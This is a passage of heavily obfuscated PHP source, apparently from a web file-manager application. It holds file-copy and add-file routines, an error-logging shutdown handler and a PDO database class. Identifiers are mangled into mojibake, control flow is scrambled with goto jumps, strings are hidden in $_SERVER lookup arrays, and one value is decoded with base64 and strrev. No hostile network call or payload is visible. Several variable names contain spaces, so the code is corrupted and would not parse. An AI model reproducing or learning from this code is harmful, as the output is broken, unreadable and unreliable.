(isset($a¥ò‹æµ§[$AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]]])) { $AÂ’•™éÁŒ = $a¥ò‹æµ§[$AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]]]; } $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[367]] = $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[29]] == $dâš¢ñáÒÙ[76]; $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[369]] = _get($AÂ’•™éÁŒ, $dâš¢ñáÒÙ[157], $dâš¢ñáÒÙ[33]); goto cªº…šº°ç; cªº…šº°ç: $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[77]] = _get($AÂ’•™éÁŒ, $dâš¢ñáÒÙ[77], 0); $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]] = _get($AÂ’•™éÁŒ, $dâš¢ñáÒÙ[415], 0); if (!isset($AÂ’•™éÁŒ[$dâš¢ñáÒÙ[537]]) && $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]]) { $aÃ˜ìÊ·Â[$dâš¢ñáÒÙ[534]][] = $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]]; } goto AæšÚÆ¸Ï; AæšÚÆ¸Ï: if ($CÆ¤à½»¼•) { $B§ôí‰Š´ä = $this->fileNameExistCache($DĞÚïğé‹, $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]]); if ($B§ôí‰Š´ä) { if ($AÂ’•™éÁŒ[$dâš¢ñáÒÙ[367]] || $CÆ¤à½»¼• == REPEAT_SKIP) { continue; } if ($CÆ¤à½»¼• == REPEAT_REPLACE) { $dœ¢—ÕÔ¦ = $this->sourceInfoCache($B§ôí‰Š´ä); $BÉ·¶¡ÚÜì = $this->fileHistory($dœ¢—ÕÔ¦, $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]], $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[77]]); if ($BÉ·¶¡ÚÜì) { $aÃ˜ìÊ·Â[$dâš¢ñáÒÙ[497]][] = $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]]; } continue; } else { if ($CÆ¤à½»¼• == REPEAT_RENAME) { $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]] = $this->fileNameAutoCache($DĞÚïğé‹, $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]], $CÆ¤à½»¼•, !1); } } } } if (!$AÂ’•™éÁŒ[$dâš¢ñáÒÙ[367]] && $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]]) { $aÃ˜ìÊ·Â[$dâš¢ñáÒÙ[497]][] = $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[415]]; } $EÂ¹›ô’İ»[] = $this->_makeItemData($AÂ’•™éÁŒ, $f’ÖôÍ©›, $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]]); goto DÍìÒó³¿í; DÍìÒó³¿í: } unset($AÂ’•™éÁŒ); if (!empty($EÂ¹›ô’İ»)) { $this->addAll($EÂ¹›ô’İ»); } goto c˜×Öœ¾ç; c˜×Öœ¾ç: $CÇÍÃ¿¦±† = $this->_childrenList($DĞÚïğé‹); $CÇÍÃ¿¦±† = array_to_keyvalue($CÇÍÃ¿¦±†, $dâš¢ñáÒÙ[28]); foreach ($Eïäæ•Ù’Š as $AÂ’•™éÁŒ) { $dœ¢—ÕÔ¦ = $CÇÍÃ¿¦±†[$AÂ’•™éÁŒ[$dâš¢ñáÒÙ[28]]]; $Eºğˆ¦Ï¯Ù = $dœ¢—ÕÔ¦[$dâš¢ñáÒÙ[366]]; $this->_copyApplyMeta($dœ¢—ÕÔ¦, $aÃ˜ìÊ·Â); if ($AÂ’•™éÁŒ[$dâš¢ñáÒÙ[29]] == $dâš¢ñáÒÙ[76]) { $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[75]] = $aÁÁ…¶¥“->getPathInner($AÂ’•™éÁŒ[$dâš¢ñáÒÙ[75]]); $this->_copyChildTo($aÁÁ…¶¥“, $AÂ’•™éÁŒ[$dâš¢ñáÒÙ[75]], $Eºğˆ¦Ï¯Ù, $CÆ¤à½»¼•, $aÃ˜ìÊ·Â, $BÊõùñîæ); } } goto A²¤èî¹ë; eì»¨ª¡ŒÈ: $dâš¢ñáÒÙ =& $_SERVER[¼]; $f’ÖôÍ©› = $this->sourceInfoCache($DĞÚïğé‹); $CŒ†¾£ÒÑ· = $aÁÁ…¶¥“->listPath($CâÕ¼¤îë, !1, !0); goto aÕƒÚÀåÒ; A²¤èî¹ë: } private function _addFiles($C„™ëë‘Ø’, $c Œ™·Şœ—, $dô›¿”†Ö) { goto b³ºÛÃ™ç¹; F¥ÇàµŠ¬¬: return $eš„ŞÂÀÉ¸; goto Fˆ¯Ú¶Ç; b³ºÛÃ™ç¹: $D¶Ğ¶œ„‹† =& $_SERVER[¼]; if (!$c Œ™·Şœ— || count($c Œ™·Şœ—) == 0) { return array(); } $c‡ ‚æ‰” = array(); goto eÃñ˜ÍƒŸ; e‡á£Ùîö: foreach ($B–½ì‰İ®À as $F¹ß‘óÀ¥’) { if (!isset($c‡ ‚æ‰”[$F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[160]]])) { continue; } $F„¢ˆ²®•ƒ =& $c‡ ‚æ‰”[$F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[160]]]; foreach ($F„¢ˆ²®•ƒ as &$Cí¹Õà²ˆä) { $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[415]] = $F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[415]]; } unset($Cí¹Õà²ˆä); } $eš„ŞÂÀÉ¸ = array(); foreach ($c Œ™·Şœ— as $C•„¸•) { $eš„ŞÂÀÉ¸[$C•„¸•[$D¶Ğ¶œ„‹†[28]]] = $C•„¸•; } goto F¥ÇàµŠ¬¬; eÃñ˜ÍƒŸ: foreach ($c Œ™·Şœ— as &$Cí¹Õà²ˆä) { goto C…‹»â¢î´; FÓÃ¦ßøĞ: if (count($c‡ ‚æ‰”[$Cœ‘½Âàã„]) > 1) { $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[537]] = !0; } goto Cóö¤Àáî‹; F­‰é¸İÕ®: $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[160]] = $Cœ‘½Âàã„; Hook::trigger($D¶Ğ¶œ„‹†[539], $Cí¹Õà²ˆä); $c‡ ‚æ‰”[$Cœ‘½Âàã„][] =& $Cí¹Õà²ˆä; goto FÓÃ¦ßøĞ; E×Á‡¹Õ½¤: $Cœ‘½Âàã„ = $C„™ëë‘Ø’->hashMd5($Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[75]]); if (strlen($Cœ‘½Âàã„) > 10 && !isset($c‡ ‚æ‰”[$Cœ‘½Âàã„])) { $c‡ ‚æ‰”[$Cœ‘½Âàã„] = array(); } $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[161]] = $F£‹ˆŠºá; goto F­‰é¸İÕ®; C…‹»â¢î´: Hook::trigger($D¶Ğ¶œ„‹†[538], $Cí¹Õà²ˆä); $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[75]] = $C„™ëë‘Ø’->getPathInner($Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[75]]); $F£‹ˆŠºá = $C„™ëë‘Ø’->hashSimple($Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[75]]); goto E×Á‡¹Õ½¤; Cóö¤Àáî‹: } $bÊ¾ˆ‘ï—™ = array($D¶Ğ¶œ„‹†[160] => array($D¶Ğ¶œ„‹†[7], array_keys($c‡ ‚æ‰”))); $c•‚Ù‰Õ˜ = Model($D¶Ğ¶œ„‹†[540]); goto bÕçËÂË; E›Ñ©°ÆˆÂ: $bÊ¾ˆ‘ï—™ = array($D¶Ğ¶œ„‹†[160] => array($D¶Ğ¶œ„‹†[7], array_keys($c‡ ‚æ‰”))); $B–½ì‰İ®À = $c•‚Ù‰Õ˜->where($bÊ¾ˆ‘ï—™)->select(); $B–½ì‰İ®À = $B–½ì‰İ®À ? $B–½ì‰İ®À : array(); goto e‡á£Ùîö; cÇ¨é¯‚ê™: $eÉäˆêŸÎ¬ = array(); foreach ($c Œ™·Şœ— as $bƒß‚è†Á‹) { if (isset($bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[537]]) && $bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[537]]) { continue; } $E•¡Ù¡Ì– = $C„™ëë‘Ø’->getPathInner($bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[75]]); $e¯›Ü¶Ê ± = $c•‚Ù‰Õ˜->addFileMake($E•¡Ù¡Ì–, $bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[77]], $bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[161]], $bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[160]], $bƒß‚è†Á‹[$D¶Ğ¶œ„‹†[28]], $dô›¿”†Ö); $eÉäˆêŸÎ¬[] = $e¯›Ü¶Ê ±; } $c•‚Ù‰Õ˜->addAll($eÉäˆêŸÎ¬); goto E›Ñ©°ÆˆÂ; bÕçËÂË: $B–½ì‰İ®À = $c•‚Ù‰Õ˜->where($bÊ¾ˆ‘ï—™)->select(); $B–½ì‰İ®À = $B–½ì‰İ®À ? $B–½ì‰İ®À : array(); foreach ($B–½ì‰İ®À as $F¹ß‘óÀ¥’) { if (!isset($c‡ ‚æ‰”[$F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[160]]])) { continue; } $F„êİ—Æå¾ = $c‡ ‚æ‰”[$F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[160]]]; foreach ($F„êİ—Æå¾ as &$Cí¹Õà²ˆä) { $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[415]] = $F¹ß‘óÀ¥’[$D¶Ğ¶œ„‹†[415]]; $Cí¹Õà²ˆä[$D¶Ğ¶œ„‹†[537]] = !0; } unset($Cí¹Õà²ˆä); } goto cÇ¨é¯‚ê™; Fˆ¯Ú¶Ç: } } define($_SERVER[¼][541], $_SERVER[¼][542]); goto FÑÌšÎåßÊ; bá¤ ØĞ–Å: function beforeShutdownError($dï—Æ¢ÂŠã = false, $b¦©‡Ñ¤–Í = '', $dõ»÷éá‘ = '', $d¥š‘ê‹ = 0) { $CƒÄùÕØÅ =& $_SERVER[À Ç]; switch ($dï—Æ¢ÂŠã) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $e‡²‡Ï×ƒÛ = $CƒÄùÕØÅ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $e‡²‡Ï×ƒÛ = $CƒÄùÕØÅ[40]; break; case E_STRICT: $e‡²‡Ï×ƒÛ = $CƒÄùÕØÅ[41]; break; case E_NOTICE: case E_USER_NOTICE: $e‡²‡Ï×ƒÛ = $CƒÄùÕØÅ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $e‡²‡Ï×ƒÛ = $CƒÄùÕØÅ[43]; break; default: break; } if (!$e‡²‡Ï×ƒÛ || $e‡²‡Ï×ƒÛ == $CƒÄùÕØÅ[42] || $e‡²‡Ï×ƒÛ == $CƒÄùÕØÅ[43]) { return; } $dõ»÷éá‘ = $CƒÄùÕØÅ[4] . str_replace($_SERVER[$CƒÄùÕØÅ[37]], $CƒÄùÕØÅ[20], $dõ»÷éá‘); $E»ğ‹—á£Í = $e‡²‡Ï×ƒÛ . $CƒÄùÕØÅ[44] . $b¦©‡Ñ¤–Í . $CƒÄùÕØÅ[44] . $dõ»÷éá‘ . $CƒÄùÕØÅ[44] . $d¥š‘ê‹; write_log($E»ğ‹—á£Í . $CƒÄùÕØÅ[18] . get_caller_msg(1), $CƒÄùÕØÅ[19]); } $_SERVER[$_SERVER[À Ç][45]] = $_SERVER[$_SERVER[À Ç][37]] . $_SERVER[À Ç][46]; $dŠøó¡²ä¼ = strrev(base64_decode($_SERVER[À Ç][47])); goto EÔ‹ò óö; b¥­§—¹¦: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($a°Ÿè”¯é‡ = '') { $aáÑ¤›„•Ø =& $_SERVER[¼]; if (!class_exists($aáÑ¤›„•Ø[821])) { think_exception(think_lang($aáÑ¤›„•Ø[10]) . $aáÑ¤›„•Ø[822]); } if (!empty($a°Ÿè”¯é‡)) { $this->config = $a°Ÿè”¯é‡; if (empty($this->config[$aáÑ¤›„•Ø[13]])) { $this->config[$aáÑ¤›„•Ø[13]] = array(); } } } public function connect($C¿Î®Ô©¿Ÿ = '', $FÌã£ºÍ¹  = 0) { $AšŠ ğƒĞ =& $_SERVER[¼]; if (!isset($this->linkID[$FÌã£ºÍ¹ ])) { goto ašêİ‚Æ; f°ÔËµäâ‡: $this->dbType = $this->_getDsnType($C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[823]]); if (in_array($this->dbType, array($AšŠ ğƒĞ[824], $AšŠ ğƒĞ[825], $AšŠ ğƒĞ[826], $AšŠ ğƒĞ[827]))) { think_exception($AšŠ ğƒĞ[828] . $this->dbType . $AšŠ ğƒĞ[829] . $this->dbType . $AšŠ ğƒĞ[830]); } if (!$this->linkID[$FÌã£ºÍ¹ ]) { think_exception($AšŠ ğƒĞ[831]); } goto E¤­Ëí×Ê; ašêİ‚Æ: if (empty($C¿Î®Ô©¿Ÿ)) { $C¿Î®Ô©¿Ÿ = $this->config; } if ($this->pconnect) { $C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$FÌã£ºÍ¹ ] = new PDO($C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[823]], $C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[796]], $C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[797]], $C¿Î®Ô©¿Ÿ[$AšŠ ğƒĞ[13]]); } catch (PDOException $e¥«ÊÙÉŞ˜) { think_exception($e¥«ÊÙÉŞ˜->getMessage()); } goto f°ÔËµäâ‡; E¤­Ëí×Ê: $this->linkID[$FÌã£ºÍ¹ ]->exec($AšŠ ğƒĞ[832] . think_config($AšŠ ğƒĞ[799])); $this->connected = !0; if (1 != think_config($AšŠ ğƒĞ[18])) { unset($this->config); } goto föÜ æ†º; föÜ æ†º: } return $this->linkID[$FÌã£ºÍ¹ ]; } public function free() { $this->PDOStatement = null; } public function query($F¾Ä¬…¼©â, $cô§Ú×‘Âô = array()) { goto BºÜ©¾Îª; BÆÔóƒ°¥¢: $this->queryStr = $F¾Ä¬…¼©â; if (!empty($cô§Ú×‘Âô)) { $this->queryStr .= $eÒÛàåÕœ½[833] . print_r($cô§Ú×‘Âô, !0) . $eÒÛàåÕœ½[834]; } if (!empty($this->PDOStatement)) { $this->free(); } goto f®…ä™ÏÅ; BºÜ©¾Îª: $eÒÛàåÕœ½ =& $_SERVER[¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÆÔóƒ°¥¢; bÑ×•®Á¦: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $c…«İé¯©Ï = $this->PDOStatement->execute($cô§Ú×‘Âô); $this->debug(); goto CÚœêÔ‹Ë¢; CÚœêÔ‹Ë¢: if (!1 === $c…«İé¯©Ï) { $this->error(); return !1; } else { return $this->getAll(); } goto bØ¾ùÜõğÅ; f®…ä™ÏÅ: think_action_status($eÒÛàåÕœ½[19], 1); think_status($eÒÛàåÕœ½[20]); $this->PDOStatement = $this->_linkID->prepare($F¾Ä¬…¼©â); goto bÑ×•®Á¦; bØ¾ùÜõğÅ: } public function execute($bÒ–‹Ïâ , $C‡¼×Šàº™ = array()) { goto céã„¬êÀí; céã„¬êÀí: $D‚Õ«æÀÊİ =& $_SERVER[¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A²Í›­ÑÛ ; b¼ŠµÅ­½¬: if ($this->dbType == $D‚Õ«æÀÊİ[827]) { if (preg_match($D‚Õ«æÀÊİ[835], $this->queryStr, $dÂïä²°‰‡)) { $this->table = think_config($D‚Õ«æÀÊİ[836]) . str_ireplace(think_config($D‚Õ«æÀÊİ[837]), $D‚Õ«æÀÊİ[358], $dÂïä²°‰‡[2]); $eŠÚÛîÁ»Í = (bool) $this->query($D‚Õ«æÀÊİ[838] . strtoupper($this->table) . $D‚Õ«æÀÊİ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($D‚Õ«æÀÊİ[21], 1); goto aĞÚ¬¡êˆ; cºÊùœ«êÇ: $aÕêˆÃçí‰ = $this->PDOStatement->execute($C‡¼×Šàº™); $this->debug(); if (!1 === $aÕêˆÃçí‰) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($eŠÚÛîÁ»Í || preg_match($D‚Õ«æÀÊİ[839], $bÒ–‹Ïâ )) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto cÁ¨è—µïÙ; A²Í›­ÑÛ : $this->queryStr = $bÒ–‹Ïâ ; if (!empty($C‡¼×Šàº™)) { $this->queryStr .= $D‚Õ«æÀÊİ[833] . print_r($C‡¼×Šàº™, !0) . $D‚Õ«æÀÊİ[834]; } $eŠÚÛîÁ»Í = !1; goto b¼ŠµÅ­½¬; aĞÚ¬¡êˆ: think_status($D‚Õ«æÀÊİ[20]); $this->PDOStatement = $this->_linkID->prepare($bÒ–‹Ïâ ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cºÊùœ«êÇ; cÁ¨è—µïÙ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D´ÃËŞÃ£ = $this->_linkID->commit(); $this->transTimes = 0; if (!$D´ÃËŞÃ£) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c—·…·ëÌÒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c—·…·ëÌÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $EíŒ’ÑØ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($EíŒ’ÑØ); return $EíŒ’ÑØ; } public function getFields($b‹ééß˜¦­) { goto då±áæØÖ„; då±áæØÖ„: $FÙ’Ä„îÔ =& $_SERVER[¼]; $this->initConnect(!0); if (think_config($FÙ’Ä„îÔ[840])) { $F¦×ôá¾‰æ = str_replace($FÙ’Ä„îÔ[841], $b‹ééß˜¦­, think_config($FÙ’Ä„îÔ[840])); } else { switch ($this->dbType) { case $FÙ’Ä„îÔ[824]: case $FÙ’Ä„îÔ[842]: $F¦×ôá¾‰æ = "\x53\x45\x4c\x45\103\124\40\x20\40\143\157\x6c\165\x6d\x6e\137\x6e\141\155\x65\x20\141\163\40\47\x4e\141\155\x65\x27\54\40\40\x20\144\141\164\x61\x5f\x74\x79\x70\145\40\141\x73\x20\x27\124\x79\160\x65\x27\54\x20\40\x20\x63\x6f\154\165\x6d\x6e\137\144\x65\x66\x61\165\x6c\164\40\x61\163\x20\47\104\145\x66\x61\x75\154\164\x27\x2c\x20\x20\x20\151\x73\137\156\x75\154\x6c\141\142\x6c\145\40\x61\163\x20\x27\x4e\165\x6c\154\x27\xa\x9\x9\106\122\x4f\x4d\x9\x69\156\146\157\x72\x6d\141\164\151\157\156\137\163\x63\x68\x65\155\x61\x2e\x74\x61\142\x6c\145\x73\x20\101\x53\x20\x74\xa\x9\11\x4a\x4f\x49\116\x9\x69\156\x66\157\162\155\x61\x74\151\157\x6e\137\163\x63\x68\x65\x6d\141\x2e\x63\x6f\154\165\155\156\163\x20\x41\x53\x20\x63\12\x9\11\117\116\x20\40\x74\x2e\164\141\142\154\x65\x5f\x63\x61\164\141\154\157\x67\x20\75\x20\143\x2e\164\x61\142\154\145\137\143\141\164\x61\x6c\157\147\xa\11\11\101\116\x44\40\164\56\x74\x61\142\154\145\137\x73\x63\150\145\x6d\141\40\75\x20\x63\x2e\164\x61\x62\x6c\145\x5f\x73\x63\150\145\155\x61\xa\x9\x9\101\116\104\40\x74\56\164\141\x62\x6c\145\x5f\x6e\141\155\x65\40\75\x20\143\x2e\x74\x61\x62\154\x65\137\156\141\x6d\145\12\11\x9\x57\x48\x45\122\x45\x20\40\x20\x74\56\x74\x61\142\154\x65\137\156\x61\x6d\x65\40\75\40\x27{$b‹ééß˜¦­}\x27"; break; case $FÙ’Ä„îÔ[843]: $F¦×ôá¾‰æ = $FÙ’Ä„îÔ[844] . $b‹ééß˜¦­ . $FÙ’Ä„îÔ[845]; break; case $FÙ’Ä„îÔ[825]: case $FÙ’Ä„îÔ[827]: $F¦×ôá¾‰æ = $FÙ’Ä„îÔ[846] . $FÙ’Ä„îÔ[847] . $FÙ’Ä„îÔ[848] . strtoupper($b‹ééß˜¦­) . $FÙ’Ä„îÔ[849] . strtoupper($b‹ééß˜¦­) . $FÙ’Ä„îÔ[850]; break; case $FÙ’Ä„îÔ[851]: $F¦×ôá¾‰æ = $FÙ’Ä„îÔ[852] . $b‹ééß˜¦­ . $FÙ’Ä„îÔ[853]; break; case $FÙ’Ä„îÔ[826]: break; case $FÙ’Ä„îÔ[854]: default: $F¦×ôá¾‰æ = $FÙ’Ä„îÔ[855] . ($this->dbType == $FÙ’Ä„îÔ[854] ? "\x60{$b‹ééß˜¦­}\140" : $b‹ééß˜¦­); } } goto E¾ßõùâ¿; aªĞÔ™„¹: return $B¬Ä¼ƒÃ‡; goto c±’¾Šˆ¡; E¾ßõùâ¿: $F†ªÀÁ¤Ÿƒ = $this->query($F¦×ôá¾‰æ); $B¬Ä¼ƒÃ‡ = array(); if ($F†ªÀÁ¤Ÿƒ) { foreach ($F†ªÀÁ¤Ÿƒ as $aÚ·Ãø¦„‰ => $eíó¨œÙŸÔ) { $eíó¨œÙŸÔ = array_change_key_case($eíó¨œÙŸÔ); $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[28]] = isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[28]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[28]] : $FÙ’Ä„îÔ[358]; $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[29]] = isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[29]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[29]] : $FÙ’Ä„îÔ[358]; $B…àéä¥¯ = isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[258]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[258]] : $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[28]]; $B¬Ä¼ƒÃ‡[$B…àéä¥¯] = array($FÙ’Ä„îÔ[28] => $B…àéä¥¯, $FÙ’Ä„îÔ[29] => $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[29]], $FÙ’Ä„îÔ[31] => (bool) (isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[101]]) && $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[101]] === $FÙ’Ä„îÔ[33] || isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[31]]) && $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[31]] === $FÙ’Ä„îÔ[33]), $FÙ’Ä„îÔ[34] => isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[34]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[34]] : (isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[53]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[53]] : $FÙ’Ä„îÔ[358]), $FÙ’Ä„îÔ[36] => isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[89]]) ? strtolower($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[89]]) == $FÙ’Ä„îÔ[38] : (isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[54]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[54]] : !1), $FÙ’Ä„îÔ[39] => isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[856]]) ? strtolower($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[856]]) == $FÙ’Ä„îÔ[41] : (isset($eíó¨œÙŸÔ[$FÙ’Ä„îÔ[89]]) ? $eíó¨œÙŸÔ[$FÙ’Ä„îÔ[89]] : !1)); } } goto aªĞÔ™„¹; c±’¾Šˆ¡: } public function getTables($e¥‡„­‚À = '') { $eŒÆÍ’§ =& $_SERVER[¼]; if (think_config($eŒÆÍ’§[857])) { $e““º‰¡Ê = str_replace($eŒÆÍ’§[858], $e¥‡„­‚À, think_config($eŒÆÍ’§[857])); } else { switch ($this->dbType) { case $eŒÆÍ’§[825]: case $eŒÆÍ’§[827]: $e““º‰¡Ê = $eŒÆÍ’§[859]; break; case $eŒÆÍ’§[824]: case $eŒÆÍ’§[842]: $e““º‰¡Ê = $eŒÆÍ’§[860]; break; case $eŒÆÍ’§[851]: $e““º‰¡Ê = $eŒÆÍ’§[861]; break; case $eŒÆÍ’§[826]: think_exception(think_lang($eŒÆÍ’§[862]) . $eŒÆÍ’§[863]); break; case $eŒÆÍ’§[843]: $e““º‰¡Ê = $eŒÆÍ’§[42] . $eŒÆÍ’§[43] . $eŒÆÍ’§[44]; break; case $eŒÆÍ’§[854]: default: if (!empty($e¥‡„­‚À)) { $e““º‰¡Ê = $eŒÆÍ’§[807] . $e¥‡„­‚À; } else { $e““º‰¡Ê = $eŒÆÍ’§[808]; } } } $B¿ Ùã˜¯Å = $this->query($e““º‰¡Ê); $A¤‰õŒè´Ù = array(); foreach ($B¿ Ùã˜¯Å as $dµŞÊ—»¦Î => $BÍçù†º×¯) { $A¤‰õŒè´Ù[$dµŞÊ—»¦Î] = current($BÍçù†º×¯); } return $A¤‰õŒè´Ù; } protected function parseLimit($aõ¼ê®œ) { $D“ãÅ©¸•ï =& $_SERVER[¼]; $cˆš¤ÛÚ¦ = $D“ãÅ©¸•ï[33]; if (!empty($aõ¼ê®œ)) { switch ($this->dbType) { case $D“ãÅ©¸•ï[851]: case $D“ãÅ©¸•ï[843]: $aõ¼ê®œ = explode($D“ãÅ©¸•ï[47], $aõ¼ê®œ); if (count($aõ¼ê®œ) > 1) { $cˆš¤ÛÚ¦ .= $D“ãÅ©¸•ï[48] . $aõ¼ê®œ[1] . $D“ãÅ©¸•ï[49] . $aõ¼ê®œ[0] . $D“ãÅ©¸•ï[50]; } else { $cˆš¤ÛÚ¦ .= $D“ãÅ©¸•ï[48] . $aõ¼ê®œ[0] . $D“ãÅ©¸•ï[50]; } break; case $D“ãÅ©¸•ï[824]: case $D“ãÅ©¸•ï[842]: break; case $D“ãÅ©¸•ï[826]: break; case $D“ãÅ©¸•ï[825]: case $D“ãÅ©¸•ï[827]: break; case $D“ãÅ©¸•ï[854]: default: $cˆš¤ÛÚ¦ .= $D“ãÅ©¸•ï[48] . $aõ¼ê®œ . $D“ãÅ©¸•ï[50]; } } return $cˆš¤ÛÚ¦; } public function parseKey(&$d†”¼èŠò¼, $FÀƒìˆ–²£ = true) { $BÒ»¤İÖ¡ =& $_SERVER[¼]; if ($FÀƒìˆ–²£) { $d†”¼èŠò¼ = $this->parseKeyCheck($d†”¼èŠò¼); } if ($this->dbType == $BÒ»¤İÖ¡[854]) { if ($d†”¼èŠò¼ != $BÒ»¤İÖ¡[173] && !preg_match($BÒ»¤İÖ¡[818], $d†”¼èŠò¼)) { $d†”¼èŠò¼ = $BÒ»¤İÖ¡[819] . trim($d†”¼èŠò¼, $BÒ»¤İÖ¡[819]) . $BÒ»¤İÖ¡[819]; } return $d†”¼èŠò¼; } else { return parent::parseKey($d†”¼èŠò¼); } } public function close() { $this->_linkID = null; } public function error() { $BÙŒÊÄ¤‹¨ =& $_SERVER[¼]; if ($this->PDOStatement) { $F­³“¬“‚ = $this->PDOStatement->errorInfo(); $this->error = $F­³“¬“‚[1] . $BÙŒÊÄ¤‹¨[4] . $F­³“¬“‚[2]; } else { $this->error = $BÙŒÊÄ¤‹¨[33]; } if ($BÙŒÊÄ¤‹¨[33] != $this->queryStr) { $this->error .= LNG($BÙŒÊÄ¤‹¨[45]) . $this->queryStr; } think_trace($this->error, $BÙŒÊÄ¤‹¨[33], $BÙŒÊÄ¤‹¨[46]); return $this->error; } public function escapeString($cÛÍ‰Ï©÷§) { $EŠ¾³´Ãªì =& $_SERVER[¼]; switch ($this->dbType) { case $EŠ¾³´Ãªì[851]: case $EŠ¾³´Ãªì[824]: case $EŠ¾³´Ãªì[842]: case $EŠ¾³´Ãªì[854]: return addslashes($cÛÍ‰Ï©÷§); case $EŠ¾³´Ãªì[826]: case $EŠ¾³´Ãªì[843]: case $EŠ¾³´Ãªì[825]: case $EŠ¾³´Ãªì[827]: return str_ireplace($EŠ¾³´Ãªì[55], $EŠ¾³´Ãªì[56], $cÛÍ‰Ï©÷§); } } protected function parseValue($eÔİ†Ä²) { $C‡™ô°ñâ =& $_SERVER[¼]; if (is_string($eÔİ†Ä²)) { $eÔİ†Ä² = strpos($eÔİ†Ä², $C‡™ô°ñâ[4]) === 0 ? $this->escapeString($eÔİ†Ä²) : $C‡™ô°ñâ[864] . $this->escapeString($eÔİ†Ä²) . $C‡™ô°ñâ[864]; } elseif (isset($eÔİ†Ä²[0]) && is_string($eÔİ†Ä²[0]) && strtolower($eÔİ†Ä²[0]) == $C‡™ô°ñâ[282]) { $eÔİ†Ä² = $this->escapeString($eÔİ†Ä²[1]); } elseif (is_array($eÔİ†Ä²)) { $eÔİ†Ä² = array_map(array($this, $C‡™ô°ñâ[865]), $eÔİ†Ä²); } elseif 